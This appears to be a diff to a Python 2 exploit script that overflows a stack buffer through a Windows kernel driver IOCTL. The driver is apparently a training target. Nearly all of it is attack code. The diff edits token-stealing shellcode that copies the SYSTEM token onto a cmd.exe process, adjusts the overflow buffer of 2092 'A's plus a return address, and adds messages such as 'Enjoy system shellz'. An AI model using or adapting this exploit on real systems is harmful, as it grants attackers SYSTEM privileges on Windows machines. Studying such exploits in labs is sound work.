@@ -25,7 +25,10 @@ VirtualAlloc = windll.kernel32.VirtualAlloc
 CreateProcess = windll.kernel32.CreateProcessW
 
 ### Startup info for CreateProcess API ###
+
 class STARTUPINFO(Structure):
+    """STARTUPINFO struct for CreateProcess API"""
+
     _fields_ = [("cb", DWORD),
                 ("lpReserved", LPTSTR),
                 ("lpDesktop", LPTSTR),
@@ -46,6 +49,7 @@ class STARTUPINFO(Structure):
                 ("hStdError", HANDLE)]
 
 class PROCESS_INFORMATION(Structure):
+
     _fields_ = [("hProcess", HANDLE),
                 ("hThread", HANDLE),
                 ("dwProcessId", DWORD),
@@ -109,6 +113,7 @@ def shellcode(pid):
         "\x89\xB8\xF8\x00\x00\x00"          # MOV [EAX+0xF8], EDI   ; Copy SYSTEM TOKEN to overwrite cmd.exe TOKEN
         "\x61"                              # POPAD
         "\x31\xC0"                          # XOR EAX, EAX          ; Simulate driver IOCTL success epilogue
+        "\x83\xC4\x14"                      # ADD ESP, 20           ; Align for return
         "\x5D"                              # POP EBP
         "\xC2\x08\x00")                     # RETN 8
 
@@ -167,9 +172,9 @@ def ctl_code(function,
 def trigger(hDevice, dwIoControlCode, scAllocateShell):
 
     shellz = create_string_buffer("A"*2092 + struct.pack("<L", scAllocateShell))
-    print "[*]Triggering vulnerable IOCTL...[*]"
+    print "[*]Sending malicious IOCTL..."
     lpInBuffer = addressof(shellz)
-    nInBufferSize = len(shellz)
+    nInBufferSize = len(shellz) -1
     lpOutBuffer = None
     nOutBufferSize = 0
     lpBytesReturned = byref(c_ulong())
@@ -187,7 +192,7 @@ def trigger(hDevice, dwIoControlCode, scAllocateShell):
     if not pwnd:
         print "\t[-]Error: You failed\n" + FormatError()
         sys.exit(-1)
-
+    print "\t[+]Enjoy system shellz"
 if __name__ == "__main__":
         print "\nStack buffer overflow\n"
 
